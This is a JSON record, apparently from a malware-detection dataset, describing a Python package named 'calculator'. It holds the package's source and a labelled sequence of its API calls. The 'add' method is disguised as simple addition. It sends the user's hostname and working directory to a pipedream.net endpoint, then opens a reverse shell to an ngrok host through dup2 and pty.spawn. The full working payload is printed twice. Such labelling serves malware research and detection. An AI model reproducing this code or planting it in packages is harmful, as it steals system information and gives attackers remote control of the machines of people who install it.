[
  {
    "pyfile": "calculator.py",
    "code_snippet": "import os,requests,socket\n\nclass calculator:\n    def add(x, y):\n        user = os.getenv('USER')\n        host = os.getenv('HOSTNAME')\n        print(user, host)\n\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        ploads = {'hostname':hostname,'cwd':cwd}\n        requests.get(\"https://en0w6ukj0qarx.x.pipedream.net/\",params = ploads)\n\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        s.connect((\"4.tcp.eu.ngrok.io\",19931))\n        os.dup2(s.fileno(),0)\n        os.dup2(s.fileno(),1)\n        os.dup2(s.fileno(),2)\n        import pty\n        pty.spawn(\"sh\")\n\n        return x+y",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "socket.gethostname",
        "os.getcwd",
        "requests.get",
        "socket.socket",
        "socket.socket.connect",
        "socket.socket.fileno",
        "os.dup2",
        "socket.socket.fileno",
        "os.dup2",
        "socket.socket.fileno",
        "os.dup2",
        "pty.spawn"
      ],
      "api_sequence_with_args": [
        "os.getenv('USER')",
        "os.getenv('HOSTNAME')",
        "socket.gethostname()",
        "os.getcwd()",
        "requests.get('https://en0w6ukj0qarx.x.pipedream.net/', params=ploads)",
        "socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
        "socket.socket.connect(('4.tcp.eu.ngrok.io', 19931))",
        "socket.socket.fileno()",
        "os.dup2(s.fileno(), 0)",
        "socket.socket.fileno()",
        "os.dup2(s.fileno(), 1)",
        "socket.socket.fileno()",
        "os.dup2(s.fileno(), 2)",
        "pty.spawn('sh')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.connect",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.fileno",
          "id": "get_socket_fd",
          "description": "Retrieves file descriptor for socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "os.dup2",
          "id": "dup_socket_stdin",
          "description": "Duplicates socket file descriptor to standard input",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.fileno",
          "id": "get_socket_fd",
          "description": "Retrieves file descriptor for socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "os.dup2",
          "id": "dup_socket_stdout",
          "description": "Duplicates socket file descriptor to standard output",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.fileno",
          "id": "get_socket_fd",
          "description": "Retrieves file descriptor for socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "os.dup2",
          "id": "dup_socket_stderr",
          "description": "Duplicates socket file descriptor to standard error",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "pty.spawn",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import os, requests, socket\n\nclass calculator:\n    def add(x, y):\n        user = os.getenv('USER')\n        host = os.getenv('HOSTNAME')\n        hostname = socket.gethostname()\n        cwd = os.getcwd()\n        ploads = {'hostname': hostname, 'cwd': cwd}\n        requests.get('https://en0w6ukj0qarx.x.pipedream.net/', params=ploads)\n\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('4.tcp.eu.ngrok.io', 19931))\n        os.dup2(s.fileno(), 0)\n        os.dup2(s.fileno(), 1)\n        os.dup2(s.fileno(), 2)\n        import pty\n        pty.spawn('sh')\n\n        return x + y"
    }
  },
  {
    "metadata": {
      "package_name": "calculator-2c397c49ab20c445"
    }
  }
]